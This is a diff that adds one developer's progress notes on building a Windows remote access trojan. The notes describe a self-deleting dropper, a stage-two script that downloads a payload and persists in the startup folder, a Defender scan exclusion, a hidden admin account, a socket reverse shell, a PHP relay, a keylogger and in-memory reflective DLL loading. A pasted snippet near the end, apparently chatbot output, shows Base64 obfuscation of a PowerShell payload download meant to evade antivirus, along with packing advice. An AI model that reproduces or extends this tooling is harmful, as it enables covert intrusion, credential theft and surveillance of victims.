@@ -1,0 +1,122 @@
+-soo all environment is setup
+
+-both attacker n trget vms are set
+
+-script is set
+
+-now to make it self deleting
+
+-now it deletes itself after execution
+
+-now it makes a stage2.cmd which downloads the payload from the server
+    and executes it and then deletes itself and the initial script leaving 
+    the payload running on target and inside the startup folder.
+
+-stage 2 can now run scripts (ps1 and cmd)with admin previlages
+
+-now we dont need initial.ps1, make file in temp , exclude from defender scan
+
+-made admin user, got reverse shell via ssh
+
+-server ready to get text file, address issue in upload.ps1
+
+
+-now select a file to configer,  do ssh [pending!!]
+
+-code for socket programming  use this to compile         |||||  cl /EHsc client.cpp /link ws2_32.lib  ||||||
+    try to send back its ip address, should come as 2nd parameter of accept()           [  wont need this ]
+
+
+- doin research on stdin and out and pipes
+
+-pipes set up , works with cmd prompt , not to make it clean 
+    -implement with server and client                                                   [ to do ]
+
+
+- will need to make 2 sockets and 2 pipes and 2 cmd prompts on both end and connect them.
+
+- now the pipe stuff works, like i get an interactive shell through pipes and will need to all this thing in the server and client code, i think i'll need two
+pipes and send data through them.
+
+- ok soo now the shells can communicate over the socket, but now i will need to make a thread to handel the data coming from the server, and in the 
+server make threads to read and write to the socket. and it exites after inputting " dir " check y.
+
+-ok soo the reverse shell works now, there is no cmd process opening on the server, server just reads through the stdin and writes to the stdout of the 
+target's cmd process. and dir works now,  :)
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-the server is printing the command again???!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+A very interactive console and target
+
+soo apprently due to defining SOCKET sock = INVALID_SOCKET; in main , i cant use global socket , soo i passed it to the rev_shell();
+
+now to do communication over internt............ will use a php server to do that
+
+soo using php to make a file on the server, and then using the file as a means of communication, need to find a better method
+like can i use php to connect multiple clients and send and recieve data between them? without the need of a file?
+
+using file now -_-, send data followed by recieve data doesnt work but via versa works.
+
+soo now the recieve_data reads from the file and puts "`" to the file it read (so now ` represents the file is empty)
+(cant do this, will need to send "`" seperately)
+
+now the target behaves as expectedly till the option selection(switch()) , but will need to find out a way to execute stuff on target
+communication issues, i need to send 2 data at once, for keystroke injection , but target will only get the 2nd data, so i need to send the 1st data first and then the 2nd data
+and thre shoud be some indicator that the clientgot the 1st, ill wait till the client puts ` in the from_server.txt
+
+to make this rev shell work again , will need to make them wait and all :/
+
+reverse shell is working over the internt. :)
+
+added a feature in which the module downloader will send user pc info to the server.
+
+to do-> File upload and download to and from the target
+
+keylogger works, but getting detected, executing hello.vbs??? when stopping the keylogger? huh?
+
+will work on dll rn, soo that my main rat is a .dll
+
+====================================================================================================================================================================
+                                                                        TO do
+
+                            work on reflective dll [HOld]
+                            Now to make the rat use the dll functions.
+
+                            in this i seperated the modules of the keylogger
+                            it is getting detected now :(
+
+
+                            loaded from memory now to use encrypted .dlls
+                            now it doesnot use any files
+                            - need to remove all suspicious imports from the dlls too.......... [SetWindowsHookEx, UnhookWindowsHookEx]
+                            - need to obsfuscate
+                            - encryped dlls
+                            - 
+___________________________________________________________________________________________________________________________________________________________
+Obfuscating URL for Download
+You plan to host remotely and obfuscate the URL. To make this less detectable, use Base64 encoding or other obfuscation methods to hide the download source.
+
+Example (Base64 Encoding for URL Obfuscation):
+
+powershell
+Copy code
+# Encode URL
+$encodedUrl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("http://your-url.com/payload.exe"))
+$decodedUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))
+
+# Download using decoded URL
+Invoke-WebRequest -Uri $decodedUrl -OutFile "C:\Path\to\downloaded.exe"
+This keeps the download URL hidden, making it more challenging for A/V software to detect it as suspicious.                                                    
+
+___________________________________________________________________________________________________________________________________________________________
+
+
+Exclusion Avoidance:
+
+In addition to exclusions, using multi-layer obfuscation on files and processes can make detection harder.
+Pack the files into compressed archives (e.g., zip or exe packers) and then extract them to memory or the folder at runtime.
+___________________________________________________________________________________________________________________________________________________________
+
+
+Now Whole RAT works in memory, just need the loader to run (s3.exe)
+====================================================================================================================================================================
